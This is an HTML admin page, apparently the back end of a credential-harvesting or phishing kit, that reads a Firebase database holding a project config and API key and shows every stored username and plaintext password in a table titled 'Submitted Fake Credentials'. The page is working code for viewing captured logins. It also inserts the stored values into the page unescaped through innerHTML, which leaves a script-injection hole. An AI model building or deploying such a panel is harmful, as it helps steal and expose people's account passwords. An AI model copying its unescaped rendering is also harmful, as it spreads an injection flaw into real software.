
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Admin Panel</title>
  <style>
    body { font-family: Arial; background: #f5f5f5; padding: 20px; }
    table { width: 80%; margin: auto; border-collapse: collapse; }
    th, td { padding: 10px; border: 1px solid #ccc; text-align: center; }
    h2 { text-align: center; }
  </style>
</head>
<body>
  <h2>Admin Panel - View Submitted Fake Credentials</h2>
  <table>
    <thead>
      <tr><th>Username</th><th>Password</th></tr>
    </thead>
    <tbody id="userData"></tbody>
  </table>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";

    const firebaseConfig = {
  apiKey: "AIzaSyBnPdhe7aEGe_Jsygft6IKoM2eiMY84ms8",
  authDomain: "quiz-game-74e4b.firebaseapp.com",
  databaseURL: "https://quiz-game-74e4b.firebaseio.com",
  projectId: "quiz-game-74e4b",
  storageBucket: "quiz-game-74e4b.firebasestorage.app",
  messagingSenderId: "504159527517",
  appId: "1:504159527517:web:ae7a964d083d43c676e3b4"
};

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const tbody = document.getElementById("userData");

    onValue(ref(db, "users/"), (snapshot) => {
      const data = snapshot.val();
      tbody.innerHTML = "";
      for (let key in data) {
        const user = data[key];
        const row = document.createElement("tr");
        row.innerHTML = `<td>\${user.username}</td><td>\${user.password}</td>`;
        tbody.appendChild(row);
      }
    });
  </script>
</body>
</html>
